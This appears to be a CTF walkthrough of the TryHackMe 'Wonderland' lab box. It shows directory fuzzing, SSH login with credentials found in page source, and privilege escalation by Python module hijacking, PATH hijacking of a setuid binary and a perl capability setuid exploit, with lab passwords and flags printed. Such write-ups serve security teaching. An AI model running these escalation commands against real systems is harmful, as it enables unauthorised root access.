# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

![Pasted image 20250410172011.png](../../IMAGES/Pasted%20image%2020250410172011.png)

We can see this on the website, if we extract the data from the image, we can see this:

![Pasted image 20250410172036.png](../../IMAGES/Pasted%20image%2020250410172036.png)

Based on the hint, we can think that, we can find a hidden directory at:

```
/r/a/b/b/i/t
```

If we fuzz, we find this:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.54.45/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.54.45/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

img [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 158ms]
r [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
poem [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 169ms]
```


Using the logic, we know that the directory I thought about, was correct, if we visit it, we can find this:

![Pasted image 20250410172251.png](../../IMAGES/Pasted%20image%2020250410172251.png)


If we check the source code on here:

![Pasted image 20250410172312.png](../../IMAGES/Pasted%20image%2020250410172312.png)

We got some credentials maybe:

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```


If we go to ssh and try these credentials, we get the following:

![Pasted image 20250410172532.png](../../IMAGES/Pasted%20image%2020250410172532.png)

They were the credentials for ssh, let's proceed to privilege escalation.


# PRIVILEGE ESCALATION
---


Now, we got access to `ssh`, we can check the following if we use `sudo -l`:

```
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
 (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

We got sudo permissions as `rabbit` with some script called `walrus_and_the_carpenter.py`, if we check this script it contains the following:

```python
alice@wonderland:~$ cat walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright ”
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done ”
"It's very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head ”
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head ”
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat ”
And this was odd, because, you know,
They hadn't any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more ”
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes ” and ships ” and sealing-wax ”
Of cabbages ” and kings ”
And why the sea is boiling hot ”
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed ”
Now if you're ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf ”
I've had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we've brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter's spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You've had a pleasant run!
Shall we be trotting home again?"
But answer came there none ”
And that was scarcely odd, because
They'd eaten every one."""

for i in range(10):
 line = random.choice(poem.split("\n"))
 print("The line was:\t", line)v
```

Based on this, we found that the `random` module can be `Hijacked`, let's do the following to get a shell as `rabbit`:

1. Create a malicious `random.py` module:

```python
import os
os.system('/bin/bash')
```

2. Hijack the script and gain the shell as `rabbit`:

```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

![Pasted image 20250410173359.png](../../IMAGES/Pasted%20image%2020250410173359.png)

Nice, we were able to get the shell as `rabbit`, if we check the home of this user, we can find this:

```
rabbit@wonderland:/home/rabbit$ ls
teaParty
```

We got a binary called `teaParty`, if we check the strings of the binary, we can find this:

```bash
strings teaParty
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
teaParty.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

This line is pretty interesting, if we analyze it well, it is making a call to `date`, we can do the same as before but we need to path hijack that since it does not have an absolute path:

```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

So, let's do the following:

1. Create a file named `date` with this contents:

```bash
#!/bin/bash
/bin/bash 
```

2. Give the file execution permissions:

```
chmod +x date
```

3. Hijack the path:

```
export PATH=.:$PATH
```

4. Use the binary:

```
./teaParty
```

![Pasted image 20250410174605.png](../../IMAGES/Pasted%20image%2020250410174605.png)

We can see we got a shell as `hatter`, let's check our home:

```
hatter@wonderland:/home/hatter$ ls
password.txt
```

We got a password:

```
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```

We can migrate to ssh with these credentials. Now, let's check our sudo privileges:

![Pasted image 20250410174723.png](../../IMAGES/Pasted%20image%2020250410174723.png)

We got no sudo permissions, weird, maybe we can check more stuff with linpeas:

![Pasted image 20250410175343.png](../../IMAGES/Pasted%20image%2020250410175343.png)


We got capabilities set, **Capabilities** in Linux are a way to grant _specific privileges_ to a process or binary **without giving it full root access**. They break down the monolithic "root vs. non-root" model into **granular permissions**, allowing fine-grained control over what a program can do.

Knowing this, we can exploit it in the following way to get root:

```
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

![Pasted image 20250410175608.png](../../IMAGES/Pasted%20image%2020250410175608.png)

There we go, we got root access, we can now read both flags, 

```
root@wonderland:~# cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

```
root@wonderland:~# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```

![Pasted image 20250410175738.png](../../IMAGES/Pasted%20image%2020250410175738.png)

